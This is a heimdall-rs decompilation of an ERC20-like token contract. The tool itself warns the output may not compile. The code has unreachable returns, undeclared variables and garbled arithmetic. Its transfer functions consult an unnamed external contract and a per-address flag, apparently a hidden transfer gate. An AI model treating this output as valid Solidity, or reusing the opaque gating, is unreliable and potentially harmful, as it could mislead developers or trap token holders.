// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

/// @title            Decompiled Contract
/// @author           Jonathan Becker <jonathan@jbecker.dev>
/// @custom:version   heimdall-rs v0.9.0
///
/// @notice           This contract was decompiled using the heimdall-rs decompiler.
///                     It was generated directly by tracing the EVM opcodes from this contract.
///                     As a result, it may not compile or even be valid solidity code.
///                     Despite this, it should be obvious what each function does. Overall
///                     logic should have been preserved throughout decompiling.
///
/// @custom:github    You can find the open-source decompiler here:
///                       https://heimdall.rs

contract DecompiledContract {
    uint256 public constant decimals = 18;
    
    mapping(bytes32 => bytes32) storage_map_e;
    bytes32 store_a;
    uint256 public totalSupply;
    mapping(bytes32 => bytes32) storage_map_b;
    address public owner;
    mapping(bytes32 => bytes32) storage_map_c;
    mapping(bytes32 => bytes32) storage_map_f;
    bytes32 store_d;
    
    event Transfer(address, address, uint256);
    event Approval(address, address, uint256);
    
    /// @custom:selector    0x06fdde03
    /// @custom:signature   name() public view returns (string memory)
    function name() public view returns (string memory) {
        bytes1 var_a = 0x20 + (var_a + (0x20 * (((store_a & (((!bytes1(store_a)) * 0x0100) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) / 0x02) + 0x1f) / 0x20)));
        bytes1 var_b = (store_a & (((!bytes1(store_a)) * 0x0100) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)) / 0x02;
        if (!(store_a & (((!store_a) * 0x0100) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)) / 0x02) {
            if (0x1f < (store_a & (((!store_a) * 0x0100) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) / 0x02)) {
                uint256 var_c = 0;
                uint256 var_d = storage_map_b[var_c];
                if ((var_a + 0x20) + (store_a & (((!store_a) * 0x0100) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) / 0x02) > (0x20 + (var_a + 0x20))) {
                    var_d = 0x20;
                    bytes1 var_e = var_a.length;
                    if (!var_a.length) {
                        bytes1 var_f = (~((0x0100 ** (0x20 - (bytes1(var_a.length)))) - 0x01)) & (var_g);
                        return abi.encodePacked(0x20, var_a.length, (~((0x0100 ** (0x20 - (bytes1(var_a.length)))) - 0x01)) & (var_g));
                        return abi.encodePacked(0x20, var_a.length);
                    }
                }
            }
        }
    }
    
    /// @custom:selector    0xac26252e
    /// @custom:signature   Unresolved_ac26252e(uint256 arg0, uint256 arg1, uint256 arg2, uint256 arg3) public payable
    /// @param              arg0 ["uint256", "bytes32", "int256"]
    /// @param              arg1 ["uint256", "bytes32", "int256"]
    /// @param              arg2 ["uint256", "bytes32", "int256"]
    /// @param              arg3 ["uint256", "bytes32", "int256"]
    function Unresolved_ac26252e(uint256 arg0, uint256 arg1, uint256 arg2, uint256 arg3) public payable {
        require(!arg0 > 0x0100000000);
        address var_a = address(msg.sender);
        uint256 var_b = (0x20 + (0x20 + (0x20 + (0x20 + var_c)))) - (0x20 + var_c);
        bytes1 var_d = (((0x0100 * (!bytes1(store_a))) - 0x01) & (store_a)) / 0x02;
        if (!(((0x0100 * (!store_a)) - 0x01) & (store_a)) / 0x02) {
            if (0x1f < (((0x0100 * (!store_a)) - 0x01) & (store_a) / 0x02)) {
                uint256 var_e = 0;
                uint256 var_f = storage_map_c[var_e];
                if ((0x20 + (0x20 + (0x20 + (0x20 + (0x20 + var_c))))) + (((0x0100 * (!store_a)) - 0x01) & (store_a) / 0x02) > (0x20 + (0x20 + (0x20 + (0x20 + (0x20 + (0x20 + var_c))))))) {
                    bytes1 var_g = ((0x20 + (0x20 + (0x20 + (0x20 + (0x20 + var_c))))) + (((0x0100 * (!bytes1(store_a))) - 0x01) & (store_a) / 0x02) + (bytes1((0x20 + (0x20 + (0x20 + (0x20 + (0x20 + (0x20 + var_c)))))) - ((0x20 + (0x20 + (0x20 + (0x20 + (0x20 + var_c))))) + (((0x0100 * (!store_a)) - 0x01) & (store_a) / 0x02))))) - (0x20 + var_c);
                    var_f = (store_d & (((!bytes1(store_d)) * 0x0100) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)) / 0x02;
                    require(!(((0x0100 * (!bytes1(store_a))) - 0x01) & (store_a)) / 0x02);
                    require(0x1f < (((0x0100 * (!bytes1(store_a))) - 0x01) & (store_a) / 0x02));
                    var_e = 0x01;
                    uint256 var_h = storage_map_c[var_e];
                    require((0x20 + (0x20 + (0x20 + (0x20 + (0x20 + var_c))))) + (((0x0100 * (!bytes1(store_a))) - 0x01) & (store_a) / 0x02) > (0x20 + (0x20 + (0x20 + (0x20 + (0x20 + (0x20 + var_c)))))));
                    bytes1 var_i = (((0x20 + (0x20 + (0x20 + (0x20 + (0x20 + var_c))))) + (((0x0100 * (!bytes1(store_a))) - 0x01) & (store_a) / 0x02) + (bytes1((0x20 + (0x20 + (0x20 + (0x20 + (0x20 + (0x20 + var_c)))))) - ((0x20 + (0x20 + (0x20 + (0x20 + (0x20 + var_c))))) + (((0x0100 * (!store_a)) - 0x01) & (store_a) / 0x02)))) + 0x20) + (store_d & (((!bytes1(store_d)) * 0x0100) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) / 0x02) + (bytes1((0x20 + ((0x20 + (0x20 + (0x20 + (0x20 + (0x20 + var_c))))) + (((0x0100 * (!store_a)) - 0x01) & (store_a) / 0x02) + ((0x20 + (0x20 + (0x20 + (0x20 + (0x20 + (0x20 + var_c)))))) - ((0x20 + (0x20 + (0x20 + (0x20 + (0x20 + var_c))))) + (((0x0100 * (!store_a)) - 0x01) & (store_a) / 0x02))) + 0x20)) - (((0x20 + (0x20 + (0x20 + (0x20 + (0x20 + var_c))))) + (((0x0100 * (!store_a)) - 0x01) & (store_a) / 0x02) + ((0x20 + (0x20 + (0x20 + (0x20 + (0x20 + (0x20 + var_c)))))) - ((0x20 + (0x20 + (0x20 + (0x20 + (0x20 + var_c))))) + (((0x0100 * (!store_a)) - 0x01) & (store_a) / 0x02))) + 0x20) + (store_d & (((!store_d) * 0x0100) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) / 0x02)))) - var_c) - 0x20;
                    bytes1 var_c = (((0x20 + (0x20 + (0x20 + (0x20 + (0x20 + var_c))))) + (((0x0100 * (!bytes1(store_a))) - 0x01) & (store_a) / 0x02) + (bytes1((0x20 + (0x20 + (0x20 + (0x20 + (0x20 + (0x20 + var_c)))))) - ((0x20 + (0x20 + (0x20 + (0x20 + (0x20 + var_c))))) + (((0x0100 * (!store_a)) - 0x01) & (store_a) / 0x02)))) + 0x20) + (store_d & (((!bytes1(store_d)) * 0x0100) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) / 0x02)) + (bytes1((0x20 + ((0x20 + (0x20 + (0x20 + (0x20 + (0x20 + var_c))))) + (((0x0100 * (!store_a)) - 0x01) & (store_a) / 0x02) + ((0x20 + (0x20 + (0x20 + (0x20 + (0x20 + (0x20 + var_c)))))) - ((0x20 + (0x20 + (0x20 + (0x20 + (0x20 + var_c))))) + (((0x0100 * (!store_a)) - 0x01) & (store_a) / 0x02))) + 0x20)) - (((0x20 + (0x20 + (0x20 + (0x20 + (0x20 + var_c))))) + (((0x0100 * (!store_a)) - 0x01) & (store_a) / 0x02) + ((0x20 + (0x20 + (0x20 + (0x20 + (0x20 + (0x20 + var_c)))))) - ((0x20 + (0x20 + (0x20 + (0x20 + (0x20 + var_c))))) + (((0x0100 * (!store_a)) - 0x01) & (store_a) / 0x02))) + 0x20) + (store_d & (((!store_d) * 0x0100) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) / 0x02))));
                    require(!(store_d & (((!bytes1(store_d)) * 0x0100) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)) / 0x02);
                    require(((0x20 + (0x20 + (0x20 + (0x20 + (0x20 + var_c))))) + (((0x0100 * (!bytes1(store_a))) - 0x01) & (store_a) / 0x02) + (bytes1((0x20 + (0x20 + (0x20 + (0x20 + (0x20 + (0x20 + var_c)))))) - ((0x20 + (0x20 + (0x20 + (0x20 + (0x20 + var_c))))) + (((0x0100 * (!store_a)) - 0x01) & (store_a) / 0x02)))) + 0x20) + (store_d & (((!bytes1(store_d)) * 0x0100) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) / 0x02) > (0x20 + ((0x20 + (0x20 + (0x20 + (0x20 + (0x20 + var_c))))) + (((0x0100 * (!bytes1(store_a))) - 0x01) & (store_a) / 0x02) + (bytes1((0x20 + (0x20 + (0x20 + (0x20 + (0x20 + (0x20 + var_c)))))) - ((0x20 + (0x20 + (0x20 + (0x20 + (0x20 + var_c))))) + (((0x0100 * (!store_a)) - 0x01) & (store_a) / 0x02)))) + 0x20)));
                    require(keccak256(var_j) == 0xc1d381b2e0d257b9cc07d412abe2cbb159d94afe3c0f9e750413887614385a43);
                    require(0 < (arg0));
                    var_e = (0 + (0x20 + (arg0)));
                    var_k = 0x04;
                    storage_map_c[var_e] = (0x20 + (0x20 + (arg0)));
                    require(0x01 < (arg0));
                    var_e = (0 + (0x20 + (arg0)));
                    var_k = 0x06;
                    storage_map_c[var_e] = (0x40 + (0x20 + (arg0)));
                    var_f = (store_a / 0x0100) * 0x0100;
                    var_g = (0x20 + (0x20 + (0x20 + (0x20 + (0x20 + (0x20 + var_c)))))) - (0x20 + var_c);
                    var_h = (store_d & (((!bytes1(store_d)) * 0x0100) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)) / 0x02;
                    require(0x02 < (arg0));
                    require(!(0x20 + (0x20 + (arg0))) == 0);
                }
            }
            var_g = (0x20 + (0x20 + (0x20 + (0x20 + (0x20 + var_c))))) - (0x20 + var_c);
            var_f = (store_d & (((!bytes1(store_d)) * 0x0100) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)) / 0x02;
            require(!(store_d & (((!bytes1(store_d)) * 0x0100) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)) / 0x02);
            require(!(store_d & (((!bytes1(store_d)) * 0x0100) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)) / 0x02);
        }
    }
    
    /// @custom:selector    0x95d89b41
    /// @custom:signature   symbol() public view returns (string memory)
    function symbol() public view returns (string memory) {
        bytes1 var_a = 0x20 + (var_a + (0x20 * (((store_d & (((!bytes1(store_d)) * 0x0100) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) / 0x02) + 0x1f) / 0x20)));
        bytes1 var_b = (store_d & (((!bytes1(store_d)) * 0x0100) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)) / 0x02;
        if (!(store_d & (((!store_d) * 0x0100) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)) / 0x02) {
            if (0x1f < (store_d & (((!store_d) * 0x0100) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) / 0x02)) {
                var_c = 0x01;
                var_d = storage_map_b[var_c];
                if ((var_a + 0x20) + (store_d & (((!store_d) * 0x0100) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) / 0x02) > (0x20 + (var_a + 0x20))) {
                    var_d = 0x20;
                    bytes1 var_e = var_a.length;
                    if (!var_a.length) {
                        bytes1 var_f = (~((0x0100 ** (0x20 - (bytes1(var_a.length)))) - 0x01)) & (var_g);
                        return abi.encodePacked(0x20, var_a.length, (~((0x0100 ** (0x20 - (bytes1(var_a.length)))) - 0x01)) & (var_g));
                        return abi.encodePacked(0x20, var_a.length);
                    }
                }
            }
        }
    }
    
    /// @custom:selector    0xa9059cbb
    /// @custom:signature   transfer(address arg0, uint256 arg1) public payable returns (bool)
    /// @param              arg0 ["address", "uint160", "bytes20", "int160"]
    /// @param              arg1 ["uint256", "bytes32", "int256"]
    function transfer(address arg0, uint256 arg1) public payable returns (bool) {
        require(address(msg.sender));
        require(address(arg0));
        var_a = 0x70a0823100000000000000000000000000000000000000000000000000000000;
        address var_b = address(msg.sender);
        require(address(0x5491305204daca75317a0bc8c332dd61dbb77bc8).code.length);
        (bool success, bytes memory ret0) = address(0x5491305204daca75317a0bc8c332dd61dbb77bc8).Unresolved_70a08231(var_b); // staticcall
        require(!(ret0.length < 0x20), "                                      ");
        address var_c = msg.sender;
        var_d = 0x06;
        require(!storage_map_b[var_c], "                                      ");
        require(!(var_e.length > 0), "                                      ");
        uint256 var_e = 0x60 + var_e;
        var_a = 0x26;
        var_f = this.code[3161:3199];
        var_c = address(msg.sender);
        var_d = 0x04;
        require(!(arg1 > storage_map_b[var_c]), "                                      ");
        var_g = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        uint256 var_h = (0x20 + (0x04 + var_e)) - (0x04 + var_e);
        uint256 var_i = var_e.length;
        require(!(bytes1(var_e.length)), "                                      ");
        uint256 var_j = (~((0x0100 ** (0x20 - (bytes1(var_e.length)))) - 0x01)) & (var_k);
        var_c = address(msg.sender);
        var_d = 0x04;
        storage_map_b[var_c] = storage_map_b[var_c] - arg1;
        var_c = address(arg0);
        var_d = 0x04;
        require(!((arg1 + storage_map_b[var_c]) < storage_map_b[var_c]), "SafeMath: addition overflow");
        var_g = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_h = 0x20;
        var_i = 0x1b;
        var_l = 0x536166654d6174683a206164646974696f6e206f766572666c6f770000000000;
        var_c = address(arg0);
        var_d = 0x04;
        storage_map_b[var_c] = arg1 + storage_map_b[var_c];
        uint256 var_g = arg1;
        emit Transfer(address(msg.sender), address(arg0), arg1);
        var_g = 0x01;
        return 0x01;
        var_e = 0x60 + var_e;
        var_a = 0x26;
        var_f = this.code[3161:3199];
        require(!(arg1 > storage_map_b[var_c]), "                                      ");
        var_g = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_h = (0x20 + (0x04 + var_e)) - (0x04 + var_e);
        var_i = var_e.length;
        require(!(bytes1(var_e.length)), "                                      ");
        var_j = (~((0x0100 ** (0x20 - (bytes1(var_e.length)))) - 0x01)) & (var_k);
        if (!storage_map_b[var_c]) {
        }
        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_b = (0x20 + (0x04 + var_e)) - (0x04 + var_e);
        var_m = 0x23;
        var_n = this.code[3092:3127];
        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_b = (0x20 + (0x04 + var_e)) - (0x04 + var_e);
        var_m = 0x25;
        var_n = this.code[3239:3276];
    }
    
    /// @custom:selector    0x39509351
    /// @custom:signature   increaseAllowance(address arg0, uint256 arg1) public payable returns (bool)
    /// @param              arg0 ["address", "uint160", "bytes20", "int160"]
    /// @param              arg1 ["uint256", "bytes32", "int256"]
    function increaseAllowance(address arg0, uint256 arg1) public payable returns (bool) {
        address var_a = msg.sender;
        var_b = 0x05;
        var_a = address(arg0);
        address var_b = keccak256(var_a);
        require(!((arg1 + storage_map_e[var_a]) < storage_map_e[var_a]), "SafeMath: addition overflow");
        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_d = 0x20;
        var_e = 0x1b;
        var_f = 0x536166654d6174683a206164646974696f6e206f766572666c6f770000000000;
        require(address(msg.sender), "ERC20: approve to the zero address");
        require(address(arg0), "ERC20: approve to the zero address");
        var_a = address(msg.sender);
        var_b = 0x05;
        var_a = address(arg0);
        var_b = keccak256(var_a);
        storage_map_e[var_a] = arg1 + storage_map_e[var_a];
        uint256 var_c = arg1 + storage_map_e[var_a];
        emit Approval(address(msg.sender), address(arg0), arg1 + storage_map_e[var_a]);
        var_c = 0x01;
        return 0x01;
        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        uint256 var_d = (0x20 + (0x04 + var_g)) - (0x04 + var_g);
        var_e = 0x22;
        var_h = this.code[3127:3161];
        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_d = (0x20 + (0x04 + var_g)) - (0x04 + var_g);
        var_e = 0x24;
        var_h = this.code[3276:3312];
    }
    
    /// @custom:selector    0xa457c2d7
    /// @custom:signature   decreaseAllowance(address arg0, uint256 arg1) public payable returns (bool)
    /// @param              arg0 ["address", "uint160", "bytes20", "int160"]
    /// @param              arg1 ["uint256", "bytes32", "int256"]
    function decreaseAllowance(address arg0, uint256 arg1) public payable returns (bool) {
        uint256 var_a = 0x60 + var_a;
        var_b = 0x25;
        var_c = this.code[3312:3349];
        address var_d = msg.sender;
        var_e = 0x05;
        var_d = address(arg0);
        address var_e = keccak256(var_d);
        require(!(arg1 > storage_map_f[var_d]), "                                     ");
        var_f = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        uint256 var_g = (0x20 + (0x04 + var_a)) - (0x04 + var_a);
        uint256 var_h = var_a.length;
        require(!(bytes1(var_a.length)), "                                     ");
        uint256 var_i = (~((0x0100 ** (0x20 - (bytes1(var_a.length)))) - 0x01)) & (var_j);
        require(address(msg.sender), "ERC20: approve to the zero address");
        require(address(arg0), "ERC20: approve to the zero address");
        var_d = address(msg.sender);
        var_e = 0x05;
        var_d = address(arg0);
        var_e = keccak256(var_d);
        storage_map_f[var_d] = storage_map_f[var_d] - arg1;
        address var_f = storage_map_f[var_d] - arg1;
        emit Approval(address(msg.sender), address(arg0), storage_map_f[var_d] - arg1);
        var_f = 0x01;
        return 0x01;
        var_f = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_g = (0x20 + (0x04 + var_a)) - (0x04 + var_a);
        var_h = 0x22;
        var_k = this.code[3127:3161];
        var_f = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_g = (0x20 + (0x04 + var_a)) - (0x04 + var_a);
        var_h = 0x24;
        var_k = this.code[3276:3312];
    }
    
    /// @custom:selector    0xdd62ed3e
    /// @custom:signature   allowance(address arg0, address arg1) public view returns (uint256)
    /// @param              arg0 ["address", "uint160", "bytes20", "int160"]
    /// @param              arg1 ["address", "uint160", "bytes20", "int160"]
    function allowance(address arg0, address arg1) public view returns (uint256) {
        address var_a = address(arg0);
        var_b = 0x05;
        var_a = address(arg1);
        address var_b = keccak256(var_a);
        address var_c = storage_map_e[var_a];
        return storage_map_e[var_a];
    }
    
    /// @custom:selector    0x23b872dd
    /// @custom:signature   transferFrom(address arg0, address arg1, uint256 arg2) public payable
    /// @param              arg0 ["address", "uint160", "bytes20", "int160"]
    /// @param              arg1 ["address", "uint160", "bytes20", "int160"]
    /// @param              arg2 ["uint256", "bytes32", "int256"]
    function transferFrom(address arg0, address arg1, uint256 arg2) public payable {
        require(address(arg0));
        require(address(arg1));
        var_a = 0x70a0823100000000000000000000000000000000000000000000000000000000;
        address var_b = address(arg0);
        require(address(0x5491305204daca75317a0bc8c332dd61dbb77bc8).code.length);
        (bool success, bytes memory ret0) = address(0x5491305204daca75317a0bc8c332dd61dbb77bc8).Unresolved_70a08231(var_b); // staticcall
        require(!(ret0.length < 0x20), "                                      ");
        address var_c = address(arg0);
        var_d = 0x06;
        require(!storage_map_b[var_c], "                                      ");
        require(!(var_e.length > 0), "                                      ");
        uint256 var_e = 0x60 + var_e;
        var_a = 0x26;
        var_f = this.code[3161:3199];
        var_c = address(arg0);
        var_d = 0x04;
        require(!(arg2 > storage_map_b[var_c]), "                                      ");
        var_g = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        uint256 var_h = (0x20 + (0x04 + var_e)) - (0x04 + var_e);
        uint256 var_i = var_e.length;
        require(!(bytes1(var_e.length)), "                                      ");
        uint256 var_j = (~((0x0100 ** (0x20 - (bytes1(var_e.length)))) - 0x01)) & (var_k);
        var_c = address(arg0);
        var_d = 0x04;
        storage_map_b[var_c] = storage_map_b[var_c] - arg2;
        var_c = address(arg1);
        var_d = 0x04;
        require(!((arg2 + storage_map_b[var_c]) < storage_map_b[var_c]), "SafeMath: addition overflow");
        var_g = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_h = 0x20;
        var_i = 0x1b;
        var_l = 0x536166654d6174683a206164646974696f6e206f766572666c6f770000000000;
        var_e = 0x60 + var_e;
        var_a = 0x26;
        var_f = this.code[3161:3199];
        require(!(arg2 > storage_map_b[var_c]), "                                      ");
        var_g = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_h = (0x20 + (0x04 + var_e)) - (0x04 + var_e);
        var_i = var_e.length;
        require(!(bytes1(var_e.length)), "                                      ");
        var_j = (~((0x0100 ** (0x20 - (bytes1(var_e.length)))) - 0x01)) & (var_k);
        if (!storage_map_b[var_c]) {
        }
        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_b = (0x20 + (0x04 + var_e)) - (0x04 + var_e);
        var_m = 0x23;
        var_n = this.code[3092:3127];
        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_b = (0x20 + (0x04 + var_e)) - (0x04 + var_e);
        var_m = 0x25;
        var_n = this.code[3239:3276];
    }
    
    /// @custom:selector    0x70a08231
    /// @custom:signature   balanceOf(address arg0) public view returns (uint256)
    /// @param              arg0 ["address", "uint160", "bytes20", "int160"]
    function balanceOf(address arg0) public view returns (uint256) {
        address var_a = address(arg0);
        var_b = 0x06;
        var_a = address(arg0);
        var_b = 0x04;
        address var_c = storage_map_e[var_a] + storage_map_e[var_a];
        return storage_map_e[var_a] + storage_map_e[var_a];
    }
    
    /// @custom:selector    0x095ea7b3
    /// @custom:signature   approve(address arg0, uint256 arg1) public payable returns (bool)
    /// @param              arg0 ["address", "uint160", "bytes20", "int160"]
    /// @param              arg1 ["uint256", "bytes32", "int256"]
    function approve(address arg0, uint256 arg1) public payable returns (bool) {
        require(address(msg.sender), "ERC20: approve to the zero address");
        require(address(arg0), "ERC20: approve to the zero address");
        address var_a = address(msg.sender);
        var_b = 0x05;
        var_a = address(arg0);
        address var_b = keccak256(var_a);
        storage_map_e[var_a] = arg1;
        uint256 var_c = arg1;
        emit Approval(address(msg.sender), address(arg0), arg1);
        var_c = 0x01;
        return 0x01;
        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        uint256 var_d = (0x20 + (0x04 + var_e)) - (0x04 + var_e);
        var_f = 0x22;
        var_g = this.code[3127:3161];
        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_d = (0x20 + (0x04 + var_e)) - (0x04 + var_e);
        var_f = 0x24;
        var_g = this.code[3276:3312];
    }
}